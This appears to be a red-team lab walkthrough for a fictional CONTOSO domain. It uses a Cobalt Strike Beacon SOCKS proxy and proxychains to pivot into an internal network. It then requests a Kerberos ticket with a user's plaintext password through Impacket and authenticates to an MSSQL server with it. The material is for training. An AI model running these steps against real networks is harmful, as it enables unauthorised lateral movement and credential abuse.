# Kill Chain

1. \
   On the Attacker Desktop, run Terminal as a local admin.
2.  Add the following static DNS entry:

    ```batch
    Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.20 lon-db-1'
    ```
3. Open Cobalt Strike and connect to the team server.
4. Use Beacon to start a SOCKS 5 proxy on port 1080.
   1. socks 1080 socks5

## proxychains <a href="#proxychains" id="proxychains"></a>

1. From Terminal, launch Ubuntu.
2.  Run sudo nano /etc/proxychains.conf.

    > The password is Passw0rd!.
3. Comment out _proxy\_dns_ on _line 38_.
4. Replace the proxy entry on line 64 with socks5 10.0.0.5 1080.
5. Save the file (Ctrl+O, Ctrl+X)
6.  Use rsteel's plaintext password to request a TGT.

    ```shell-nocolor
    proxychains getTGT.py 'CONTOSO.COM/rsteel:Passw0rd!' -dc-ip 10.10.120.1
    ```
7. Set the KRB5CCNAME environment variable.
   1. export KRB5CCNAME=rsteel.ccache
8.  Use the TGT to authenticate to the _lon-db-1_ SQL instance.

    ```shell-nocolor
    proxychains mssqlclient.py contoso.com/rsteel@lon-db-1 -windows-auth -no-pass -k -dc-ip 10.10.120.1
    ```
9. Execute some SQL commands.
   1. select @@servername;
   2. exit
